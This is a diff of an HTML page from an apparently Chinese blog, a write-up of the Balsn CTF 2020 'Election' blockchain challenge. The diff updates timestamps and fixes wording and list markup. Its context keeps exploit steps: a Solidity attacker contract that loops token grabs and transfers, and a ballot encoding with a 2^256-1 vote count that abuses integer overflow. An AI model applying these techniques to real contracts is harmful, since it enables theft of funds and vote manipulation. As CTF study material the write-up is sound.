@@ -98,7 +98,7 @@
 <meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/balsn2020_election/11.jpg">
 <meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/balsn2020_election/12.jpg">
 <meta property="og:image" content="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/balsn2020_election/2.jpg">
-<meta property="og:updated_time" content="2021-03-07T07:51:50.793Z">
+<meta property="og:updated_time" content="2021-03-07T07:57:16.141Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Balsn CTF 2020 - Election">
 <meta name="twitter:description" content="前言  复现 balsn2020 ctf 中的 Election 区块链题目，当时没做出来😭 wtcl ，都 2021 了，还在看 2020 的题目 这篇会写的很详细，大佬勿喷🙈 具体分析及官方 WP 如下：https://x9453.github.io/2021/02/27/Balsn-CTF-2020-Election/ 源码 https://github.com/hitcxy/chal">
@@ -390,7 +390,7 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2021-03-07T15:51:50+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2021-03-07T15:57:16+08:00">
                 2021-03-07
               </time>
             
@@ -525,7 +525,7 @@
 </li>
 </ul>
 <ol>
-<li>通过下列脚本，另 <code>times = 64</code>，使 <code>_balances[attacker] = 0x40</code></li>
+<li>通过下列脚本，令 <code>times = 64</code>，使 <code>_balances[attacker] = 0x40</code></li>
 </ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract son &#123;</span><br><span class="line">    Election target = Election(0xef31471E3004a78Ae403858BbcB27D6d1f37791C);</span><br><span class="line">    </span><br><span class="line">    function getmoney(uint times) public &#123;</span><br><span class="line">        for (uint i=0; i&lt;times; i++) &#123;</span><br><span class="line">            target.giveMeMoney();</span><br><span class="line">            target.transfer(0x52cC2403764380CCa583633d2523999FE5077113, 1, &quot;&quot;, &quot;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/balsn2020_election/3.jpg" alt></p>
@@ -533,14 +533,13 @@
 <li>准备两个 <code>ballot</code>，一个投给 <code>attacker</code>，票数为 <code>2^256-1</code> ；一个投给 <code>Alice</code>，票数为 <code>1</code></li>
 </ol>
 <ul>
-<li>先进行 <code>ballotEncode</code> 计算<ul>
-<li>调用形式如下</li>
-</ul>
-</li>
+<li>先进行 <code>ballotEncode</code> 计算，调用形式如下</li>
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ballotEncode([[&quot;0x52cC2403764380CCa583633d2523999FE5077113&quot;,&quot;0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;], [&quot;0x0000000000000000000000000000000000009453&quot;,&quot;0x1&quot;]])</span><br></pre></td></tr></table></figure>
-<pre><code>- 结果如下图所示
-</code></pre><p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/balsn2020_election/4.jpg" alt></p>
+<ul>
+<li>结果如下图所示</li>
+</ul>
+<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/balsn2020_election/4.jpg" alt></p>
 <ul>
 <li>调用 <code>vote(0x741d83d533784642740e64dbea7fa658c082a96b14623cdb1866e58c252f7f23)</code> ，然后查看 <code>voteHashes[0]</code> 成功显示 （使用 <span id="inline-blue">attacker账户</span> ）</li>
 </ul>
